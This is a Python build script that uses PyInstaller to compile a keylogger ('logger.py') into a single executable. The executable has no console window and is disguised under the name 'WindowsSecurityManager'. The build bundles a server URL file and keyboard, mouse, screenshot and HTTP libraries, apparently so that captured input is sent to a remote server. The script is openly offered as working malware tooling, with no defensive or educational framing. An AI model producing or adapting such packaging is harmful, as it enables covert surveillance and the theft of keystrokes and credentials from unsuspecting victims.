import PyInstaller.__main__
import os
import sys

def build_keylogger():
    """Build the keylogger into a standalone executable"""
    
    # Ensure server URL is available
    if not os.path.exists("server_url.txt"):
        print("❌ server_url.txt not found!")
        return
    
    PyInstaller.__main__.run([
        'logger.py',
        '--onefile',
        '--noconsole',
        '--name=WindowsSecurityManager',
        '--add-data=server_url.txt;.',
        '--hidden-import=pynput.keyboard',
        '--hidden-import=pynput.mouse',
        '--hidden-import=pyautogui',
        '--hidden-import=win32gui',
        '--hidden-import=win32console',
        '--hidden-import=requests',
        '--clean'
    ])

if __name__ == "__main__":
    build_keylogger()
    print("✅ Keylogger compiled successfully!")